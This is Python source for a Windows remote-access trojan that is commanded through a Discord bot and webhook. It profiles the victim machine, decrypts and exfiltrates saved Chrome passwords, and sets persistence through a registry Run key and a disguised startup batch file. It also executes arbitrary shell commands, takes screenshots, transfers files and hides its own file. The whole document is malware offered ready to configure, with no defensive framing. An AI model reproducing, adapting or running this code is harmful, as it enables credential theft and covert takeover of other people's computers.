import discord
import os
import asyncio
import requests
import urllib
import json
import ctypes
import sys
import atexit
import re
import base64
import sqlite3
import shutil
import win32crypt
import subprocess
import winreg as reg
from PIL import Image
from discord.ext import commands
from Cryptodome.Cipher import AES
import win32api, win32con, win32gui, win32ui

intents = discord.Intents.all()
intents.message_content = True

#------------------------------------------------------------------#
#In your server you MUST create a text channel named 'check-in' and
#create a webhook that posts in the 'check-in' channel
#Supply that Webhook URL to the whURL variable
#------------------------------------------------------------------#

#Enter your Discord servers webhook URL, bot token, and server id, filename of the executable
whURL = ''
TOKEN = ''
serverID =  #Takes an integer
filename = 'harmony.pyw'

webhook = discord.SyncWebhook.from_url(whURL)
client = discord.Client(intents=intents)

hwid = ''

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

@client.event
async def on_ready():
    first_run = True
    global hwid
    
    guild = client.get_guild(serverID)
    
    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
   
    for category_name in guild.categories:
        if hwid == str(category_name):

            first_run = False
            break
        
    for channel in guild.channels:
        if str(channel) == 'check-in':
            await channel.send("{} has connected.".format(hwid))
            break

    if first_run:
        category = await guild.create_category(hwid)
        await guild.create_text_channel('main', category=category)
        await guild.create_text_channel('info', category=category)
        await guild.create_text_channel('creds', category=category)
        
        for channel in category.channels:
            if channel.name == 'creds':
                creds = cred_stealer()
                if len(creds) > 2000:
                    t =  creds[2000:]
                    creds = creds[:2000]
                    
                    await msg.channel.send(creds.decode())
                    
                    if t:
                        await msg.channel.send(t.decode())
                    
                    creds = b''
                    t = b''
                
                await channel.send(creds)
                
            if channel.name == 'info':
                
                info_buffer = ''
                
                is_persistant = addPersistence()
                    
                is_admin = isAdmin()                
                computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
                cpu = subprocess.run(["wmic", "cpu", "get", "Name"],capture_output=True, text=True).stdout.strip().split('\n')[2]
                gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
                ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
                username = os.getenv("UserName")
                hostname = os.getenv("COMPUTERNAME")
                
                url = 'http://ipinfo.io/json'
                response = urllib.request.urlopen(url)
                data = json.load(response)

                IP=data['ip']
                org=data['org']
                city = data['city']
                country=data['country']
                region=data['region']
                
                
                
                mac = subprocess.check_output("getmac", shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8')

                info_buffer = "Info Dump\n\nPersistence: {}\nisAdmin: {}\n\nOS: {}\nCPU: {}\nGPU: {}\nRAM: {}\nUsername: {}\nHostname: {}\n\n\n".format(is_persistant, is_admin, computer_os, cpu, gpu, ram, username, hostname, is_admin)
                info_buffer += "IP: {}\nOrg: {}\nCity: {}\nRegion: {}\nCountry: {}\n\nMAC Details:\n{}".format(IP, org, city, region, country, mac)
                
                await channel.send(info_buffer)                
                
        
@client.event
async def on_message(msg):
    if msg.channel.name == 'main':
        prefix = b'Results of ' + msg.content.encode() + b' \n\n'
        response = b''
        
        if msg.author == client.user:
            return
        
        str_msg = msg.content.lower()
        
        try:
            command = str_msg.split(" ", 1)[0]
            args = str_msg.split(" ", 1)[1]
        except IndexError:
            pass
            
        if str_msg[0] == ">":
            str_msg = str_msg[1:]
            
            if str_msg[0] == " ":
                str_msg = str_msg[1:]

            for line in runCommand(str_msg):
                response += line
                
                if len(response) > 2000:
                    t = response[2000:]
                    response = response[:2000]
                    
                    await msg.channel.send(response.decode())
                    
                    if t:
                        await msg.channel.send(t.decode())
                    
                    response = b''
                    t = b''

            if response == b'':
                response = prefix + b'Invalid Command.'
                
            else:
                response = prefix + response
            
            await msg.channel.send(response.decode())

        elif command == "kill":
            p = killProc(args)
            
            await msg.channel.send(p)
        
        elif str_msg == "hide":
            p = hideFile()
            
            if p is None:
                p = "Successfully hid file"
                
            await msg.channel.send(p)

        elif str_msg == "unhide":
            p = unhideFile()
            
            if p is None:
                p = "Successfully unhid file"
                
            await msg.channel.send(p)
                
        elif command == "download" or command == "dl":
            try:
                await msg.channel.send(file=discord.File(args))
                
            except Exception as e:
                await msg.channel.send(e)
                
        elif str_msg == "upload" or str_msg == "ul":
            await upload(msg)
            
        elif str_msg == "ss" or str_msg == "screenshot":
            s = getScreenshot()
            
            if s:
                await msg.channel.send(file=discord.File("C:\\Users\\Public\\Downloads\\Update.jpg"))
                
                os.remove("C:\\Users\\Public\\Downloads\\Update.jpg")
                
            else:
                await msg.channel.send("Failed to take screenshot.")
                
        elif str_msg == "listwindows" or str_msg == "lw":
            p = printWindows()
            
            await msg.channel.send(p)
        
        elif str_msg == "creddump" or str_msg == "cred":
            dump = cred_stealer()
            
            await msg.channel.send(dump)
            
        elif str_msg == "persistence" or str_msg == "pt":            
            p = addPersistence()
            result = "Failed to add persistence."
            
            if p:
                result = "Successfully added persistence."
                
            await msg.channel.send(result)

def killProc(pid):
    try:
        p = subprocess.run(["taskkill","/F","/PID",pid],stdout=subprocess.PIPE,stderr=subprocess.PIPE,check=True)
    except Exception as p:
        pass
        
    return p
    
def hideFile():
    p = None
    try:
        subprocess.run(["attrib","+H",filename],check=True)
        
    except Exception as p:
        pass
        
    return p
        
def unhideFile():
    p = None
    try:
        subprocess.run(["attrib","-H",filename],check=True)
        
    except Exception as p:
        pass
        
    return p
        
def addPersistence():
    s = addToRegistry()
    
    if not s:
        s = addToStartup()
        
    return s
    
async def upload(msg):
    if msg.attachments == "[]":
        pass
    else:
        try:
            fname = msg.attachments[0].filename
            
            await msg.attachments[0].save(fp="C:\\Users\\Public\\Downloads\\{}".format(fname))
            await msg.channel.send("File saved to public downloads directory.")
        except IndexError:
            await msg.channel.send("Failed to upload...")

def printWindows():
    window_list = listWindows()
    str_w_l = 'Active Windows:\n\n'
    
    for window in window_list:
        str_w_l += "Window: " + window + "\n"
        
    return str_w_l

def addToStartup():
    try:
        startup_is = False
        temp = os.getenv("TEMP")
        login = os.getlogin()
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % login
        file_path = os.path.abspath(sys.argv[0])
            
        with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
            bat_file.write(r'start "" "%s"' % file_path)
        startup_is = True
        return startup_is
    except:
        return False

def addToRegistry():
    try:
        pth = os.path.dirname(os.path.realpath(__file__)) 
         
        address=os.path.join(pth,filename) 
         
        key = HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
         
        reg.SetValueEx(open,"test",0,reg.REG_SZ,address)
         
        reg.CloseKey(open)
        
        return True
        
    except:
        return False
    
def runCommand(command):
    try:
        p = subprocess.Popen(command, shell = True,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT)
        
        return iter(p.stdout.readline, b'')    
    except Exception as p:
        return p
        
#Gets all open windows
def winEnumHandler(window_name, w_list):
    if win32gui.IsWindowVisible(window_name):
        str_w = win32gui.GetWindowText(window_name)
        
        if str_w != '' and str_w != ' ' and str_w != 'Settings':    
            w_list.append("{}".format(str_w))

#Returns a list of open windows
def listWindows():  
    win_list = []    
    win32gui.EnumWindows(winEnumHandler, win_list)
    
    return win_list
        
#Get screenshot of current window
def getScreenshot(path=None):
    try:
        x = 0
        y = 0
        
        x2 = win32api.GetSystemMetrics(0)
        y2 = win32api.GetSystemMetrics(1)
        
        W = x2 - x
        H = y2 - y
        
        #get image data
        wDC = win32gui.GetWindowDC(None)
        dcObj = win32ui.CreateDCFromHandle(wDC)
        cDC = dcObj.CreateCompatibleDC()
        dataBitMap = win32ui.CreateBitmap()
        dataBitMap.CreateCompatibleBitmap(dcObj, W, H)
        cDC.SelectObject(dataBitMap)
        cDC.BitBlt((0, 0), (W, H), dcObj, (0, 0), win32con.SRCCOPY)

        if path == None:
            dataBitMap.SaveBitmapFile(cDC, 'C:\\Users\\Public\\Downloads\\Update.jpg')
            img = Image.open('C:\\Users\\Public\\Downloads\\Update.jpg')
            img.save('C:\\Users\\Public\\Downloads\\Update.jpg', optimize=True)
        else:
            dataBitMap.SaveBitmapFile(cDC, path)

        #Free Resources
        dcObj.DeleteDC()
        cDC.DeleteDC()
        win32gui.ReleaseDC(None, wDC)
        win32gui.DeleteObject(dataBitMap.GetHandle())

        return True
        
    except:
        return False

def isAdmin():
    user = ''
    admins = ''
    platform = 'powershell.exe '
    admin_cmd = 'net localgroup administrators'
    admin_cmd = admin_cmd.split()
    
    for line in runCommand('whoami'):
        user += line.decode()
    for line in runCommand(admin_cmd):
        admins += line.decode()
        
    if '\\' in user:
        user = user.split('\\')[1]

    if 'Administrator' in admins:
        admins = admins.split('Administrator')[2]

    if user in admins:
        return True
        
    else:
        return False

#Credits to LimerBoy for cred_stealer
def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:

        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        return None
       
def cred_stealer():
    response = ''
    try:
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    
                    if(url!="" and username!="" and ciphertext!=""):
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        response += "Sequence: %d\n"%(index)
                        response += "URL: %s\nUser Name: %s\nPassword: %s\n\n"%(url,username,decrypted_password)
                        response += "*"*50
                        response += "\n"
                cursor.close()
                conn.close()
                os.remove("Loginvault.db")
    except Exception as e:
        pass
        
    return response

def exit_handler():
    message = hwid + " Has Disconnected."
    
    webhook.send(message)    
           
atexit.register(exit_handler)

client.run(TOKEN)
